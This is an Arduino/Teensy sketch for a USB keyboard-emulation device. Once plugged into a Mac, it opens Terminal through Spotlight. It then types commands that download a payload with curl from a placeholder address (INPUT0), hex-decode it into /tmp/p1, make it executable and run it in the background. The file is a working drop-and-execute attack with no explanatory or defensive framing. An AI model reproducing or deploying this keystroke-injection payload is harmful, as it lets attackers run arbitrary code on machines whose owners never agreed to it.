
void setup()
{
  delay(5000);
  run("terminal");
  delay(3000);
  Keyboard.print("curl INPUT0");
  delay(100);
  Keyboard.println(">/tmp/pay");
  delay(5000);
  Keyboard.print("xxd -r -p /tmp/pay");
  delay(100);
  Keyboard.println(" /tmp/p1");
  delay(100);
  Keyboard.println("chmod +x /tmp/p1");
  delay(100);
  Keyboard.println("/tmp/p1 &");
  
}

void loop()
{
   
}

void run(char *SomeCommand){
  
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.set_key1(KEY_SPACE);
  Keyboard.send_now();

  delay(500);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();

  Keyboard.print(SomeCommand);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  Keyboard.set_key1(0);
  Keyboard.send_now();
}


